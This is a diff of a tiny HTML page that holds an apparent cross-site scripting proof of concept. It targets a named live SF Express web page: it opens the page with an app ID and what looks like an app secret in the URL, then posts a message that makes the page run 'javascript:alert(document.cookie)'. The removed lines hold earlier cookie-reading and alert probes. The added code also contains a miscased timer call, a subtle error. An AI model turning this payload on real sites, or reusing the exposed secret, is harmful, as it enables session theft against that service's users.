@@ -1,13 +1,10 @@
 <html>
 <body>
 <script>
-console.log(document.domain);
-var ccc = document.cookie;
- console.log(ccc);
- const json = '{"result":true, "count":42}';
-const obj = JSON.parse.call(json,alert(1));
- window.name = ");console.log(document.domain);//";
-window.parent.parent.postMessage(alert(1),"*");
+hwin = window.open("https://fusionwork.sf-express.com/static-contact-desk/pc?appId=2ed411eab19f471da830895195be8574&appSecret=60d4f952e5eb46d890b9508671c04dc5");
+settimeout(function(){
+ hwin.postMessage({"type":"openUrl","url":"javascript:alert(document.cookie)"},"*")
+},5)
 //window.parent.parent.location.href = "https://www.google.com";
 </script>
 </body>
